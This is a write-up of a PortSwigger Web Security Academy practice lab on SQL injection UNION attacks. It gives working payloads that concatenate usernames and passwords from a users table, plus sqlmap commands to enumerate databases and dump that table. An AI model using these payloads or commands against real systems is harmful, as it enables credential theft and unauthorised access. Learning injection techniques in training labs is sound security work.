\+ Lab #6    : SQL injection UNION attack, retrieving multiple values in a single column\
\+ Lab Level : Practitioner\
\+ Link      : https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

## About:
This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.<br/>
The database contains a different table called ```users```, with columns called ```username``` and ```password```. 
To solve the Lab, perform a [SQL injection UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks) to retrieve all usernames and passwords.

## End Goal: 
Log in as the ```administrator``` user.

## Detection:
* Submit a single quotation mark ```'``` in ```/filter?category=Gifts``` to break out the original SQL query quotation marks and cause an internal error
* The resulting query sent by the App to the back-end databases should look to something like:
```SQL
SELECT * FROM products WHERE category = 'Gifts''
```
* The App should return a ```500 Internal Server Error```, which means that an error has occured in the back-end database while processing the query.
* The ```category``` parameter is vulnerable to SQL injection.

## Exploitation:
### Manual:
> 📝: **HACK STEPS:** <br/>
> 1° Determine the number of columns that are being returned by the original query <br/>
> 2° Determine the columns that contains string data <br/>
> 3° Retrive data from ```users``` tables

#### Number of columns:
1. Intercept the request with Burp Suite proxy,
2. Send the request to repeater,
3. Start by injecting the ```category``` parameter with ```Gifts'+UNION+SELECT+NULL--``` which will return an error
4. And then ```Gifts'UNION+SELECT+NULL,NULL--``` which will return the results of the original query (Selecting content for product ```Gifts```) <br/>
> 📍 ***The number of columns is then ```2```***

#### Columns containing text:
1. Inject the ```category``` parameter with the following payload ```'+UNION+SELECT+'a',NULL--``` <br/>
      => If an ```Internal Server Error``` occurs, then the first column does not contain string type data.
2. And then, inject the vulnerable parameter with ```'+UNION+SELECT+NULL,'a'--``` <br/>
      => If an ```Internal Server Error``` is returned, then the second column does not contain string type data.

> 📍 ***In this Lab, the second column contains string data.*** 

#### Retrieving data:
* Since we know that there is a table called ```users``` that has two columns ```username``` and ```password``` and that we only have one column that return string data which we can control to fetch entries for table ```users```, we can the ```CONCAT``` clause <br/>
* For example, we can send the following payload: ```'+UNION+SELECT+NULL,CONCAT(username, ':', password)+FROM+users--```, which will return the usernames and passwords seperated with a colon ```:```
![2023-02-24 07_31_49-SQL injection UNION attack, retrieving multiple values in a single column — Mozi](https://user-images.githubusercontent.com/101610095/221108630-87b2756a-6108-4fb7-b74b-c128fc343b2c.png)

* We can also do some cool stuff with ```CONCAT``` like sending the following payload: 
```SQL
'+UNION+SELECT+NULL,CONCAT('The password of ', username, ' is : ', password)+FROM+users--
``` 
![2023-02-24 07_34_40-SQL injection UNION attack, retrieving multiple values in a single column — Mozi](https://user-images.githubusercontent.com/101610095/221109005-61fb30cb-537c-465a-afae-3d72e9d8ba90.png)

* We can also use the ```||``` to concat the results, for example:
```SQL
'+UNION+SELECT+NULL,username||':'||password+FROM+users--
```
![2023-02-24 07_31_49-SQL injection UNION attack, retrieving multiple values in a single column — Mozi](https://user-images.githubusercontent.com/101610095/221108630-87b2756a-6108-4fb7-b74b-c128fc343b2c.png)

#### Solving the Lab: 
* Now that we have dumped the credentials, we can go to ```/login``` and login as the ```Administrator``` user and solve the lab !!
![Login](https://user-images.githubusercontent.com/101610095/221110694-536b8bc1-c9de-4a38-8bd4-da3b75f997fd.png)

### Automated:
#### SQLmap:

##### Fetching Databases names:
* Command:  
```bash
sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 --dbs --batch
```
* Options: <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --proxy=http://127.0.0.1:8080 : Using BurpSuite proxy for debugging purposes <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -u : Target URL <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -p : Testable parameter <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --technique=U : SQL Injection technique to use. Here i'm using the UNION technique <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --threads : Maximum number of concurrent HTTP requests (default 1) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --level : Level of test to perform (5 is MAX) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --risk : Risk of test to perform (3 is MAX) <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --dbs : Enumerate databases (schema) names <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --batch : Never ask for user input, use the default behavior <br/>

* Execution:
![2023-02-24 08_00_33-HACKING_MACHINE - VMware Workstation 16 Player (Non-commercial use only)](https://user-images.githubusercontent.com/101610095/221113676-d7224171-9ec8-442d-b008-e663e506c820.png)<br/>

##### Dumping data from table 'users' in database 'public':
* Command:  
```bash
sqlmap --proxy=http://127.0.0.1:8080 -u 'https://0aa8007d033d30a9c0f2d25500e700ca.web-security-academy.net/filter?category=*' -p category --technique=U --threads=5 --level=4 --risk=3 -D public -T users --dump --batch 
```
* Options: <br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --dump : Dump database table entries <br/>

* Execution: <br/>
![2023-02-24 07_58_23-HACKING_MACHINE - VMware Workstation 16 Player (Non-commercial use only)](https://user-images.githubusercontent.com/101610095/221113993-b9113a42-353a-4d27-88a3-377850614303.png)

#### Python3:
* Refer to https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/SQL%20Injection/Lab%236/Lab-6.py
* Requirements:
```bash
pip3 install -m requirements.txt
```
* Help Menu: 
```bash
$ python3 Lab-6.py --help
usage: Lab-6.py [-h] -u URL [-n]

Usage Example: python3 Lab-6.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                               
```
![Lab-6](https://user-images.githubusercontent.com/101610095/221149027-bd9696a0-8880-450e-b5b0-e1cad7d17184.gif)

